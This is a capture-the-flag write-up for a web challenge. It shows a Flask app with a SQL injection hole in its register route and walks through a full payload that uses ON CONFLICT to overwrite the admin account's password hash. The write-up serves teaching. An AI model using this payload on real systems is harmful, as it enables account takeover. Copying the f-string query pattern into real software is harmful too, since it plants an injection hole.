# Spooky Query Leaks

Author: RJCyber

category: web

Description: `HELP! A ghost just took over my website and database! Can you get back in?`

## Solution 

The name of the challenge (Spooky Query Leaks) and the description mentioning "database," it can be inferred that the website is vulnerable to SQL injection.

Let's take a look at the source code of the Flask app running on the website.

```py
from flask import Flask, render_template, request, redirect, session, g
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = 'REDACTED'

DATABASE = 'challenge.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor = get_db().cursor()
        try:
            cursor.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{generate_password_hash(password)}')")
            get_db().commit()
            return redirect('/login')
        except sqlite3.IntegrityError:
            return "Username already taken."

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor = get_db().cursor()

        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()

        if user and check_password_hash(user['password'], password):
            session['username'] = user['username']
            return redirect('/dashboard')
        else:
            return "Invalid credentials."

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect('/login')

    username = session['username']
    cursor = get_db().cursor()

    if username == 'admin':
        cursor.execute("SELECT flag FROM flags")
        flag = cursor.fetchone()['flag']
        return render_template('dashboard.html', username=username, flag=flag)

    return render_template('dashboard.html', username=username, flag=None)

if __name__ == '__main__':
    app.run(debug=False)
```

The vulnerability lies in `/register` since the other endpoints have parameterized queries. The register endpoint is the only one that uses user input without parameterization, making it vulnerable to SQL injection. However, the injection here involves the following `INSERT` statement: 

`INSERT INTO users (username, password) VALUES ('{username}', '{generate_password_hash(password)})`

Since we can control the username input, we can try to overwrite the admin user in the database by injecting the INSERT statement. Additionally, the hashing algorithm for the password is known, which allows us to create our own password and hash it using the same function. The `generate_password_hash()` function comes from the `werkzeug.security` python library. 

We can generate our own hash by running this code:

```py
from werkzeug.security import *
print(generate_password_hash('password'))
```

The output hash can then be used for the injection to set a password on the user we register.

`scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61`

So, we can now control the register statement.
`admin', 'scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61'); -- -`

However...
We cannot overwrite the admin user's password quite yet. For this we need to add `ON CONFLICT` to overwrite the admin entry in the database.

The final payload ends up being:

```
admin', 'scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61') ON CONFLICT(username) DO UPDATE SET password = "scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61"; -- -
```

This would cause the full query to become:

`INSERT INTO users (username, password) VALUES ('admin', 'scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61') ON CONFLICT(username) DO UPDATE SET password = "scrypt:32768:8:1$wZEReaEsvTYA8XAL$266ab0a3862ba2a6119e0f575c1de17ce1ac079e77f122e26d04beb9253f414e44315362d86a6a252ff08d02047d476f650c3b8a7b50c8b17e04a8e597288e61"; -- -', '{generate_password_hash(password)})`

After overwriting the admin password, you can then login with username `admin` and the password set by the payload (`password` in our case).
